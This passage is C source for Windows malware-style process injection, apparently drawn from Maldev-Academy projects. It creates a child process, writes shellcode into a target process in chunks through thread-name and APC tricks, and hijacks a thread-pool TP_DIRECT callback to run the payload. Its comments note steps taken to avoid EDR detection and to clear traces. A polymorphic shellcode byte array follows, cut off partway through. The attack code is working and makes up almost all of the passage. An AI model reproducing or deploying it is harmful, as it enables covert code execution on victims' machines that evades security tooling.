        &hChildProcess,                                                         // ProcessHandle
        &hChildThread,                                                          // ThreadHandle
        PROCESS_ALL_ACCESS,                                                     // ProcessDesiredAccess
        THREAD_ALL_ACCESS,                                                      // ThreadDesiredAccess
        NULL,                                                                   // ProcessObjectAttributes
        NULL,                                                                   // ThreadObjectAttributes
        (uInheritHandleCount > 0) ? PROCESS_CREATE_FLAGS_INHERIT_HANDLES : 0,   // ProcessFlags
        0,                                                                      // ThreadFlags
        pProcParams,                                                            // ProcessParameters
        &psCreateInfo,                                                          // CreateInfo
        pAttrList                                                               // AttributeList
    );
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtCreateUserProcess Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    DBG("[+] %s Child Spawned (hProcess=0x%p, hThread=0x%p)", bHardenChild ? "Hardened" : "Normal", hChildProcess, hChildThread);
    
    bResult = TRUE;

_END_OF_FUNC:
    if (pProcParams)        g_WinAPIs.pRtlDestroyProcessParameters(pProcParams);
    if (pAttrList)          HeapFree(GetProcessHeap(), 0x00, pAttrList);

    if (hChildProcess)
    {
        INITIALIZE_SYSCALL(g_Syscalls.ntClose);
        (VOID)INVOKE_SYSCALL(hChildProcess);
    }
    if (hChildThread)
    {
        INITIALIZE_SYSCALL(g_Syscalls.ntClose);
        (VOID)INVOKE_SYSCALL(hChildThread);
    }

    return bResult;
}

#pragma endregion   // Process Creation

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// The following function is from
// https://github.com/Maldev-Academy/WhisperHijack

#pragma region TNC Delivery

static BOOL WriteMemoryViaThreadNameApc(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pAllocatedAddress, IN PBYTE pShellcodeBuffer, IN ULONG uShellcodeSize, IN BOOL bExecuteShellcode)
{
    NTSTATUS                    ntStatus            = STATUS_SUCCESS;
#ifdef PEB_SCRATCH_SLOT_OFFSET
    PROCESS_BASIC_INFORMATION   ProcessBasicInfo    = { 0 };
#else
    THREAD_BASIC_INFORMATION    ThreadBasicInfo     = { 0 };
#endif
    OBJECT_ATTRIBUTES           ObjAttr             = { 0 };
    LARGE_INTEGER               liTimeout           = { 0 };
    UNICODE_STRING              usName              = { 0 };
    UNICODE_STRING              usEmpty             = { 0 };
    PBYTE                       pPadding            = NULL;
    PVOID                       pScratchSlot        = NULL,
                                pHeapInTgt          = NULL;
    HANDLE                      hLocalEvent         = NULL,
                                hRemoteEvent        = NULL;
    SIZE_T                      cbBytesIO           = 0x00;
    ULONG                       uOffset             = 0x00,
                                uChunks             = 0x00,
                                uRetLen             = 0x00;
    BOOL                        bResult             = FALSE;

    if (!hProcess || !hThread || !pAllocatedAddress || !pShellcodeBuffer || !uShellcodeSize)
        return FALSE;


#ifdef PEB_SCRATCH_SLOT_OFFSET

    // GetThreadDescription writes its heap-allocated name buffer pointer into a caller-supplied PWSTR*, 
    // so we need somewhere inside the target that is a known fixed address we can compute without a prior cross-process write,
    // Also, should never be touched by the OS or the target process itself.
    // The chosen PEB field (see OPTION 1/2 above) fits these requirements. The PEB base comes from
    // NtQueryInformationProcess(ProcessBasicInformation). The APC drops the heap pointer there, we 
    // read it back with NtReadVirtualMemory, then queue the RtlMoveMemory APC that copies from that 
    // heap address to pAllocatedAddress.
    INITIALIZE_SYSCALL(g_Syscalls.ntQueryInformationProcess);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, (ULONG_PTR)ProcessBasicInformation, &ProcessBasicInfo, (ULONG_PTR)sizeof(ProcessBasicInfo), &uRetLen);
    if (!NT_SUCCESS(ntStatus) || !ProcessBasicInfo.PebBaseAddress)
    {
        DBG("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    pScratchSlot = (PVOID)((ULONG_PTR)ProcessBasicInfo.PebBaseAddress + PEB_SCRATCH_SLOT_OFFSET);

    DBG("[i] Target Scratch Slot: 0x%p (PEB Base: 0x%p)", pScratchSlot, ProcessBasicInfo.PebBaseAddress);

#else
    
    // GetThreadDescription writes its heap-allocated name buffer pointer into a caller-supplied PWSTR*, 
    // so we need somewhere inside the target that is a known fixed address we can compute without a prior cross-process write,
    // Also, should never be touched by the OS or the target process itself.
    // TEB.TlsSlots[63] fits these requirements. The TEB base comes from NtQueryInformationThread
    // (ThreadBasicInformation). TLS slots are 8 bytes each on x64, and TlsAlloc hands out slots
    // bottom-up starting at 0, so slot 63 is almost never claimed. The APC drops the heap pointer 
    // there, we read it back with NtReadVirtualMemory, then queue the RtlMoveMemory APC that copies 
    // from that heap address to pAllocatedAddress.
    INITIALIZE_SYSCALL(g_Syscalls.ntQueryInformationThread);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, (ULONG_PTR)ThreadBasicInformation, &ThreadBasicInfo, (ULONG_PTR)sizeof(ThreadBasicInfo), &uRetLen);
    if (!NT_SUCCESS(ntStatus) || !ThreadBasicInfo.TebBaseAddress)
    {
        DBG("[!] NtQueryInformationThread Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }
    
    pScratchSlot = (PVOID)((ULONG_PTR)ThreadBasicInfo.TebBaseAddress + TEB_SCRATCH_SLOT_OFFSET);
    
    DBG("[i] Target Scratch Slot: 0x%p (TEB Base: 0x%p, TlsSlots[%d])", pScratchSlot, ThreadBasicInfo.TebBaseAddress, TEB_SCRATCH_SLOT_IDX);

#endif

    // We need a cross-process signal so the Writer knows exactly when the heap pointer has
    // landed in the scratch slot. Therefore we call NtCreateEvent to create us a local event, then
    // NtDuplicateObject mirrors it into the target so an in-target NtSetEvent APC can signal 
    // through the dup'd handle. SynchronizationEvent (auto-reset) means each wait auto-clears, 
    // so we don't need an NtResetEvent call between chunks.
    // When the Writer blocks on NtWaitForSingleObject(hLocalEvent) and the in-target APC chain
    // fires NtSetEvent as its final step, our wait returns and we can safely NtReadVirtualMemory
    // the scratch slot. The heap pointer is then guaranteed to be there by FIFO APC ordering.
    InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);

    INITIALIZE_SYSCALL(g_Syscalls.ntCreateEvent);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(&hLocalEvent, EVENT_ALL_ACCESS, &ObjAttr, (ULONG_PTR)SynchronizationEvent, (ULONG_PTR)FALSE);
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtCreateEvent Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }
   
    DBG("[i] Local Sync Event Created: 0x%0.8X", hLocalEvent);

    // Duplicate into the target so the target-side NtSetEvent APC has a valid handle.
    INITIALIZE_SYSCALL(g_Syscalls.ntDuplicateObject);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(
        NtCurrentProcess(),                                                 // SourceProcessHandle
        hLocalEvent,                                                        // SourceHandle
        hProcess,                                                           // TargetProcessHandle
        &hRemoteEvent,                                                      // TargetHandle 
        EVENT_ALL_ACCESS,                                                   // DesiredAccess
        (ULONG_PTR)0,                                                       // HandleAttributes
        (ULONG_PTR)0                                                        // Options 
    );
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtDuplicateObject Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    DBG("[i] Event Handle Duplicated Into Target: 0x%0.8X", hRemoteEvent);

    //
    // Per-chunk chain:
    //
    //   1.             NtSetInformationThread(ThreadName)          : Stash chunk in ETHREAD->ThreadName
    //   2. (APC #1)    [RtlFillMemory(scratch, 8, 0)]              : Zero slot inside target (no cross-proc write)
    //   3. (APC #2)    [GetThreadDescription(-2, scratch)]         : Target heap-allocates, writes ptr to slot
    //   4. (APC #3)    [NtSetEvent(hRemoteEvent)]                  : Signal Writer from inside target
    //   5. (OPTIONAL)  NtAlertThread                               : Drain APCs #1-#3 
    //   6.             NtWaitForSingleObject(hLocalEvent)          : Block until APC #3 fires
    //   7.             NtReadVirtualMemory(scratch)                : Pull heap pointer back to Writer
    //   8. (APC #3)    [RtlMoveMemory(dst, heapPtr, len)]          : Copy heap stash to final destination
    //   9.             NtAlertThread                               : Drain APC #3 before next iteration
    //
    while (uOffset < uShellcodeSize)
    {
        ULONG uChunk = ((uShellcodeSize - uOffset) < MAX_THREAD_NAME_LEN) ? (uShellcodeSize - uOffset) : MAX_THREAD_NAME_LEN;

        // Stash chunk as the thread's name.
        // RtlInitUnicodeString sets Length by scanning for L'\0', 
        // so raw shellcode would truncate at the first null byte. Seed Length with an
        // 'A'-filled buffer of the right size, then overwrite Buffer with the real (null-containing)
        // bytes before the syscall copies them into the kernel pool.
        if (!(pPadding = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uChunk + sizeof(WCHAR))))
        {
            DBG("[!] HeapAlloc Failed With Error: %lu", GetLastError());
            goto _END_OF_FUNC;
        }
        
        RtlFillMemory(pPadding, uChunk, 'A');
        g_WinAPIs.pRtlInitUnicodeString(&usName, (PCWSTR)pPadding);
        RtlCopyMemory(usName.Buffer, &pShellcodeBuffer[uOffset], uChunk);

        // Run NtSetInformationThread(ThreadNameInformation)
        INITIALIZE_SYSCALL(g_Syscalls.ntSetInformationThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, (ULONG_PTR)ThreadNameInformation, &usName, (ULONG_PTR)sizeof(UNICODE_STRING));
        HeapFree(GetProcessHeap(), 0x00, pPadding);
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtSetInformationThread [Chunk @ %lu] Failed With Error: 0x%0.8X", uOffset, ntStatus);
            goto _END_OF_FUNC;
        }

        // APC #1: 
        // RtlFillMemory zeroes the scratch slot in-target, clearing any stale heap pointer from the previous chunk.
        // NtQueueApcThread Running RtlFillMemory(pScratchSlot, sizeof(PVOID), 0x00);
        INITIALIZE_SYSCALL(g_Syscalls.ntQueueApcThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, g_WinAPIs.pRtlFillMemory,
            pScratchSlot,                                                   // Destination
            (PVOID)(ULONG_PTR)sizeof(PVOID),                                // Length 
            (PVOID)0x00                                                     // Fill byte
        );
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtQueueApcThread [RtlFillMemory @ %lu] Failed With Error: 0x%0.8X", uOffset, ntStatus);
            goto _END_OF_FUNC;
        }

        // APC #2: GetThreadDescription reads thread name, heap-allocates in the target, 
        // and writes the heap pointer into our scratch slot.
        // 
        // NtQueueApcThread Running GetThreadDescription(NtCurrentThread(), pScratchSlot);
        pHeapInTgt = NULL;
        INITIALIZE_SYSCALL(g_Syscalls.ntQueueApcThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, g_WinAPIs.pGetThreadDescription,
            (PVOID)NtCurrentThread(),                                       // -2, always valid in target
            pScratchSlot,                                                   // PWSTR* receiver
            NULL
        );
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtQueueApcThread [GetThreadDescription @ %lu] Failed With Error: 0x%0.8X", uOffset, ntStatus);
            goto _END_OF_FUNC;
        }

        // APC #3: NtSetEvent signals hRemoteEvent in-target. FIFO ordering guarantees this fires
        // after #1 and #2, so when the Writer's NtWaitForSingleObject returns, the heap pointer
        // is in the scratch slot and ready to read.
        // 
        // NtQueueApcThread Running NtSetEvent(hRemoteEvent);
        INITIALIZE_SYSCALL(g_Syscalls.ntQueueApcThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, g_WinAPIs.pNtSetEvent,
            hRemoteEvent,                                                   // Event handle (valid in target)
            NULL,                                                           // PreviousState (ignored)
            NULL
        );
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtQueueApcThread [NtSetEvent @ %lu] Failed With Error: 0x%0.8X", uOffset, ntStatus);
            goto _END_OF_FUNC;
        }

        /*
        // Drain APCs #1-#3. NtAlertThread wakes the target's alertable wait with STATUS_ALERTED,
        // forcing the queued user-mode APCs to run in before the wait returns.
        INITIALIZE_SYSCALL(g_Syscalls.ntAlertThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread);
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtAlertThread Failed With Error: 0x%0.8X", ntStatus);
            goto _END_OF_FUNC;
        }
        */

        // Block on the event, wakes when APC #3 fires inside target
        liTimeout.QuadPart = -((LONGLONG)TNC_WAIT_TIMEOUT_MS * 10000LL);

        INITIALIZE_SYSCALL(g_Syscalls.ntWaitForSingleObject);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hLocalEvent, (ULONG_PTR)FALSE, &liTimeout);
        if (ntStatus == STATUS_TIMEOUT)
        {
            DBG("[!] NtWaitForSingleObject Timed Out [@ Offset %lu]. Target Thread Didn't Drain APCs in %ums", uOffset, TNC_WAIT_TIMEOUT_MS);
            goto _END_OF_FUNC;
        }
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X", ntStatus);
            goto _END_OF_FUNC;
        }

        // Read the scratch slot, heap pointer is guaranteed to be there now
        INITIALIZE_SYSCALL(g_Syscalls.ntReadVirtualMemory);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hProcess, pScratchSlot, &pHeapInTgt, (ULONG_PTR)sizeof(PVOID), &cbBytesIO);
        if (!NT_SUCCESS(ntStatus) || !pHeapInTgt)
        {
            DBG("[!] NtReadVirtualMemory [@ Offset %lu] Failed With Error: 0x%0.8X", uOffset, ntStatus);
            goto _END_OF_FUNC;
        }

        // APC #4: RtlMoveMemory copies the chunk from the target heap buffer (where
        // GetThreadDescription stashed it) to its final home at pAllocatedAddress + uOffset.
        // This is the only step that actually writes the payload to its destination region.
        //
        // NtQueueApcThread Running RtlMoveMemory((ULONG_PTR)pAllocatedAddress + uOffset, pHeapInTgt, uChunk);
        INITIALIZE_SYSCALL(g_Syscalls.ntQueueApcThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, g_WinAPIs.pRtlMoveMemory,
            (PVOID)((ULONG_PTR)pAllocatedAddress + uOffset),                // Destination
            pHeapInTgt,                                                     // Source
            (PVOID)(ULONG_PTR)uChunk                                        // Length
        );
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtQueueApcThread [RtlMoveMemory @ %lu] Failed With Error: 0x%0.8X", uOffset, ntStatus);
            goto _END_OF_FUNC;
        }

        // Drain APC #4 before the next iteration overwrites the thread name
        INITIALIZE_SYSCALL(g_Syscalls.ntAlertThread);
        (VOID)INVOKE_SYSCALL(hThread);

        uChunks++;
        uOffset += uChunk;
    }

    // Clear thread name, so that we don't leave shellcode in ETHREAD->ThreadName 
    INITIALIZE_SYSCALL(g_Syscalls.ntSetInformationThread);
    (VOID)INVOKE_SYSCALL(hThread, (ULONG_PTR)ThreadNameInformation, &usEmpty, (ULONG_PTR)sizeof(UNICODE_STRING));

    /*
    // Close the target-side event handle via an in-target APC 
    INITIALIZE_SYSCALL(g_Syscalls.ntQueueApcThread);
    (VOID)INVOKE_SYSCALL(hThread, g_WinAPIs.pNtClose, hRemoteEvent, NULL, NULL);
    hRemoteEvent = NULL;  
    */

    DBG("[*] All Chunks Written: %lu Bytes In %lu Chunks @ 0x%p (%lu APCs Dispatched)", uShellcodeSize, uChunks, pAllocatedAddress, (ULONG)(uChunks * 4));

    bResult = TRUE;

    // Execute the shellcode (Optional)
    // In this project, this is never used
    if (bExecuteShellcode)
    {
        INITIALIZE_SYSCALL(g_Syscalls.ntQueueApcThread);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(hThread, pAllocatedAddress, NULL, NULL, NULL);
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtQueueApcThread Failed With Error: 0x%0.8X", ntStatus);
            bResult = FALSE;
            goto _END_OF_FUNC;
        }

        INITIALIZE_SYSCALL(g_Syscalls.ntAlertThread);
        (VOID)INVOKE_SYSCALL(hThread);

        DBG("[*] Execution APC Queued At 0x%p", pAllocatedAddress);
    }

_END_OF_FUNC:
    if (hLocalEvent)
    {
        INITIALIZE_SYSCALL(g_Syscalls.ntClose);
        (VOID)INVOKE_SYSCALL(hLocalEvent);
    }

    return bResult;
}

#pragma endregion   // TNC Delivery

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// The following functions are from
// https://github.com/Maldev-Academy/TpDirectCallbackHijack

#pragma region TP_DIRECT.Callback Hijack

//
// Restore stub emitted per-run, parameterized by:
//   (1) the ORIGINAL VALUE of TP_DIRECT.Callback (seeded into the data slot
//       at offset +0x00, fetched at runtime via RIP-relative lea + mov)
//   (2) the ABSOLUTE ADDRESS of &TP_DIRECT.Callback (baked as the imm64
//       of the "mov rcx, imm64" at offset +0x16)
//
// The stub does NOT depend on what any register holds at entry - works
// identically for TP_IO / TP_ALPC / TP_JOB regardless of the dispatch
// chain's ABI.
//
// Layout (35 bytes):
//
//   [+0x00..+0x07] Data slot: original TP_DIRECT.Callback value (patched by Writer).
//   [+0x08]        push rax
//   [+0x09]        push rcx
//   [+0x0A]        lea  rax, [rip - 0x11]         ; rax = &data_slot
//   [+0x11]        mov  rax, [rax]                ; rax = original Callback value
//   [+0x14]        mov  rcx, imm64                ; rcx = &TP_DIRECT.Callback (patched by Writer)
//   [+0x1E]        mov  [rcx], rax                ; *(&TP_DIRECT.Callback) = original
//   [+0x21]        pop  rcx
//   [+0x22]        pop  rax
//   [+0x23]        (payload falls through here)
//
#define RESTORE_STUB_DATA_OFFSET            0x00    // Data slot: original Callback value (8-byte patch target)
#define RESTORE_STUB_ENTRY_OFFSET           0x08    // Entry point (what we patch into TP_DIRECT.Callback)
#define RESTORE_STUB_IMM64_OFFSET           0x16    // imm64 inside "mov rcx, imm64" (8-byte patch target)

//
// Template bytes. Both data slots (the +0x00 value slot and the +0x16 imm64 inside
// the "mov rcx, imm64") are zeroed here; EmitRestoreStub patches them per-run.
//
static CONST UCHAR g_RestoreStubTemplate[] =
{
    // [+0x00] Data slot: pOriginalCallback           (patched by EmitRestoreStub)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

    // [+0x08] push rax
    0x50,
    // [+0x09] push rcx
    0x51,
    // [+0x0A] lea rax, [rip - 0x11]                  ; rax = &data_slot (@ +0x00)
    0x48, 0x8D, 0x05, 0xEF, 0xFF, 0xFF, 0xFF,
    // [+0x11] mov rax, [rax]                         ; rax = *data_slot = original Callback
    0x48, 0x8B, 0x00,
    // [+0x14] mov rcx, imm64                         ; rcx = &TP_DIRECT.Callback  (imm64 @ +0x16, patched by EmitRestoreStub)
    0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // [+0x1E] mov [rcx], rax                         ; *(&TP_DIRECT.Callback) = rax = original
    0x48, 0x89, 0x01,
    // [+0x21] pop rcx
    0x59,
    // [+0x22] pop rax
    0x58,
};

//
// Fill a caller-provided 0x23-byte buffer with the stub bytes, patching the two
// runtime-dependent slots: the original Callback value (data slot @ +0x00) and the
// absolute VA of &TP_DIRECT.Callback (imm64 @ +0x16).
//
static VOID EmitRestoreStub(OUT PBYTE pStub, IN PVOID pOriginalCallback, IN PVOID pTpDirectCallbackVA)
{
    RtlCopyMemory(pStub, g_RestoreStubTemplate, sizeof(g_RestoreStubTemplate));

    *(ULONGLONG*)(pStub + RESTORE_STUB_DATA_OFFSET)  = (ULONGLONG)(ULONG_PTR)pOriginalCallback;
    *(ULONGLONG*)(pStub + RESTORE_STUB_IMM64_OFFSET) = (ULONGLONG)(ULONG_PTR)pTpDirectCallbackVA;
}

//
// Flipper's job:
//
//   1. Queue an in-target RtlMoveMemory APC that copies the pre-planted
//      Callback value from (pAllocatedAddress + cbSize - 8) into
//      g_tpInjectTarget.pTpDirectCallbackVA.
//
//   2. Flip the payload region from PAGE_READWRITE to PAGE_EXECUTE_READWRITE
//      via NtProtectVirtualMemory. Skipped on the RWX-reuse path (the
//      region is already executable).
//
//   3. NtAlertThread drains the queued APC through the target's alertable
//      wait (NtWaitForWorkViaWorkerFactory), so TP_DIRECT.Callback is
//      patched before the completion packet gets dispatched.
//
//   4. NtSetIoCompletion fires one packet on the stolen IoCompletion handle
//      with KeyContext = &TP_DIRECT. The parked pool worker dequeues, reads
//      TP_DIRECT.Callback (now = restore stub entry), and calls it.
//
// At step 4, the restore stub puts the original Callback value back into
// TP_DIRECT.Callback and falls through into the user payload. The payload's
// final 'ret' lands back in TppWorkerThread's dispatch loop, and the thread
// re-enters its wait.
//
static BOOL HijackTpDirectCallback(IN PVOID pAllocatedAddress, IN SIZE_T cbSize)
{
    NTSTATUS    ntStatus    = STATUS_SUCCESS;
    PVOID       pFlipAddr   = pAllocatedAddress;
    SIZE_T      cbFlipSize  = cbSize;
    ULONG       uOldProt    = 0x00;

    if (!g_tpInjectTarget.hProcess || !g_tpInjectTarget.hThread || !g_tpInjectTarget.hIoCompletion ||
        !g_tpInjectTarget.pTpDirectVA || !g_tpInjectTarget.pTpDirectCallbackVA ||
        !pAllocatedAddress || !cbSize)
        return FALSE;

    //
    // (1) Queue the Callback-patch APC.
    //
    //     Target-side effect: RtlMoveMemory(g_tpInjectTarget.pTpDirectCallbackVA,
    //                                       pAllocatedAddress + cbSize - 8,
    //                                       8);
    //
    //     Source bytes were planted at the tail of the local wrapped buffer
    //     by the Writer before TNC delivery.
    //
    INITIALIZE_SYSCALL(g_Syscalls.ntQueueApcThread);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(g_tpInjectTarget.hThread, g_WinAPIs.pRtlMoveMemory,
        g_tpInjectTarget.pTpDirectCallbackVA,                                   // Destination
        (PVOID)((ULONG_PTR)pAllocatedAddress + cbSize - sizeof(ULONG_PTR)),     // Source (shellcode-entry ptr)
        (PVOID)(ULONG_PTR)sizeof(ULONG_PTR)                                     // Length
    );
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtQueueApcThread Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    DBG("[+] Patch APC Queued: &TP_DIRECT.Callback=0x%p <- *(0x%p)",
        g_tpInjectTarget.pTpDirectCallbackVA,
        (PVOID)((ULONG_PTR)pAllocatedAddress + cbSize - sizeof(ULONG_PTR)));

    //
    // (2) Flip the payload region to RWX. The restore stub + poly shellcode
    //     both execute from here.
    //
    //     Skipped when the Writer reused an already-RWX region in the
    //     target - the memory is already executable, and the extra
    //     NtProtectVirtualMemory would just add a syscall for EDRs to
    //     notice. That's half the reason to take the RWX-reuse path at all.
    //
    if (!g_tpInjectTarget.bReusedRwx)
    {
        INITIALIZE_SYSCALL(g_Syscalls.ntProtectVirtualMemory);
        ntStatus = (NTSTATUS)INVOKE_SYSCALL(g_tpInjectTarget.hProcess, &pFlipAddr, &cbFlipSize, PAGE_EXECUTE_READWRITE, &uOldProt);
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X", ntStatus);
            return FALSE;
        }
        DBG("[+] Flipped Protection From 0x%X to RWX", uOldProt);
    }
    else
    {
        DBG("[+] Skipped NtProtectVirtualMemory (reused RWX region @ 0x%p is already executable)", pAllocatedAddress);
    }

    //
    // (3) NtAlertThread drains the patch APC so TP_DIRECT.Callback is live
    //     before the completion packet is processed. The alertable wait
    //     returns with STATUS_ALERTED, APCs drain, then TppWorkerThread
    //     loops back into NtWaitForWorkViaWorkerFactory.
    //
    INITIALIZE_SYSCALL(g_Syscalls.ntAlertThread);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(g_tpInjectTarget.hThread);
    if (!NT_SUCCESS(ntStatus))
        DBG("[!] NtAlertThread Failed With Error: 0x%0.8X", ntStatus);

    //
    // (4) Fire one completion packet with KeyContext pointing at the
    //     TP_DIRECT. TppWorkerThread's dispatch reads [KeyContext + 0x38]
    //     (now the shellcode-entry pointer) and calls it with RCX = KeyContext.
    //
    INITIALIZE_SYSCALL(g_Syscalls.ntSetIoCompletion);
    ntStatus = (NTSTATUS)INVOKE_SYSCALL(g_tpInjectTarget.hIoCompletion,
        g_tpInjectTarget.pTpDirectVA,                                           // KeyContext = &TP_DIRECT
        NULL,                                                                   // ApcContext
        (ULONG_PTR)STATUS_SUCCESS,                                              // IoStatus
        (ULONG_PTR)0x00                                                         // IoStatusInformation
    );
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtSetIoCompletion Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    DBG("[*] Completion Packet Fired (hIoCompletion=0x%p, KeyContext=&TP_DIRECT=0x%p)",
        g_tpInjectTarget.hIoCompletion, g_tpInjectTarget.pTpDirectVA);

    return TRUE;
}

#pragma endregion // TP_DIRECT.Callback Hijack

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// .\AlphabeticalPolyGen.exe --i .\x64CmdShellcode.bin --o .\x64CmdShellcode.bin.poly
// https://github.com/Maldev-Academy/AlphabeticalPolyShellGen
//
// Original Payload: https://github.com/Maldev-Academy/WhisperHijack/blob/main/WhisperHijack/Main.c#L1181
//
static UCHAR x64CmdShellcode[] =
{
    0x31, 0xC9, 0xEB, 0x23, 0x5F, 0x57, 0x30, 0xC9, 0x80, 0xC9, 0x86, 0x66, 0x0F, 0x1F, 0x44, 0x00,
    0x00, 0x88, 0xCB, 0xF6, 0xDB, 0x80, 0xC3, 0x70, 0x80, 0xC3, 0x86, 0x30, 0x1F, 0x48, 0xFF, 0xC7,
    0xE2, 0xEF, 0x5F, 0xFF, 0xE7, 0x66, 0x90, 0xE8, 0xD8, 0xFF, 0xFF, 0xFF, 0x23, 0x27, 0x25, 0x26,
    0x3C, 0xFC, 0x93, 0x9F, 0x78, 0x79, 0x7A, 0x7B, 0x22, 0x35, 0xFD, 0xB9, 0xFA, 0x3A, 0x60, 0x83,
    0x84, 0x85, 0x0F, 0x58, 0x59, 0x66, 0xBB, 0x42, 0xB5, 0x74, 0xFD, 0xAF, 0x9F, 0x26, 0x96, 0xDD,
    0xD5, 0x1D, 0x56, 0x56, 0x70, 0x91, 0xDB, 0x13, 0x5D, 0xDC, 0x1E, 0x6F, 0x40, 0xE0, 0x62, 0x6B,
    0xA0, 0xE0, 0x8E, 0x6F, 0xEC, 0x21, 0xAE, 0xA5, 0x53, 0x6C, 0x45, 0x73, 0x39, 0x49, 0x31, 0x53,
    0x48, 0x74, 0x5E, 0xB5, 0x89, 0x70, 0x83, 0x7A, 0xCF, 0xB0, 0x35, 0xAB, 0x4E, 0x00, 0x00, 0xD3,
    0x4D, 0xD1, 0x48, 0x38, 0x09, 0x22, 0x25, 0x9C, 0x9A, 0x85, 0x47, 0x3F, 0x98, 0xD0, 0x2A, 0x9B,
    0x5D, 0x2C, 0x9E, 0xE6, 0x0A, 0x91, 0x5F, 0x12, 0xA8, 0xD7, 0x56, 0xCF, 0xA8, 0x1E, 0x22, 0xAB,
    0x1B, 0x2C, 0x0D, 0x16, 0xB6, 0xB6, 0xA2, 0x62, 0x00, 0xB0, 0xB1, 0xA7, 0x79, 0x01, 0xAC, 0xA8,
    0x0B, 0x15, 0x69, 0x41, 0x6C, 0x73, 0x6C, 0x75, 0x69, 0x42, 0x6B, 0x52, 0x6E, 0x65, 0x59, 0x47,
    0x6A, 0x50, 0x6A, 0x58, 0x6B, 0x4E, 0x63, 0x54, 0x66, 0x78, 0x6D, 0x70, 0x6C, 0x65, 0x6B, 0x58,
    0x4C, 0x70, 0x66, 0x68, 0x6A, 0x54, 0x6D, 0x6B, 0x6B, 0x54, 0x48, 0x61, 0x63, 0x64, 0x4C, 0x71,
    0x7A, 0x61, 0x6D, 0x4D, 0x68, 0x56, 0x6D, 0x73, 0x7A, 0x61, 0x4E, 0x74, 0x68, 0x70, 0x69, 0x50,
    0x6D, 0x4D, 0x6D, 0x62, 0x57, 0x6B, 0x7A, 0x61, 0x6F, 0x6D, 0x78, 0x41, 0x6F, 0x6D, 0x6B, 0x70,
    0x61, 0x6B, 0x6D, 0x4D, 0x6D, 0x5A, 0x68, 0x58, 0x78, 0x41, 0x69, 0x41, 0x68, 0x4C, 0x69, 0x68,
    0x66, 0x65, 0x67, 0x61, 0x78, 0x61, 0x4D, 0x4F, 0x6C, 0x6C, 0x68, 0x69, 0x76, 0x49, 0x6F, 0x6D,
    0x6E, 0x74, 0x64, 0x4A, 0x6F, 0x6D, 0x69, 0x50, 0x65, 0x57, 0x69, 0x74, 0x67, 0x69, 0x6A, 0x54,
    0x66, 0x49, 0x68, 0x71, 0x6D, 0x4B, 0x50, 0x54, 0x67, 0x4C, 0x61, 0x6B, 0x6E, 0x67, 0x6A, 0x56,
    0x65, 0x56, 0x4B, 0x63, 0x6D, 0x6F, 0x68, 0x4C, 0x75, 0x52, 0x6C, 0x53, 0x45, 0x6B, 0x4B, 0x4C,
